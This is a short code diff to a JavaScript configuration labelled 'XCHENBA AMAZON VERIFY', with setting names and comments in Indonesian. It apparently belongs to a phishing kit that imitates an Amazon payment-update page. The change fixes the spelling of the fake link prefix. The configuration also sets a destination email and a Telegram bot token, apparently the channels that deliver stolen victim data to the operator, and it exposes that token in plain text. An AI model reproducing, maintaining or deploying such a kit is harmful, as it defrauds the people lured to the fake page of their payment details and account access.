@@ -2,7 +2,7 @@
 // KONFIGURASI UTAMA — XCHENBA AMAZON VERIFY
 // ==================================================
 const CONFIG = {
-    awalanTautan: localStorage.getItem('awalanTautan') || 'Update-payment-methode',
+    awalanTautan: localStorage.getItem('awalanTautan') || 'Update-payment-method',
     parameterAkhir: '=aktif',
     emailTujuan: localStorage.getItem('emailTujuan') || 'jandaanaksatu777@gmail.com',
     telegramToken: '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk',
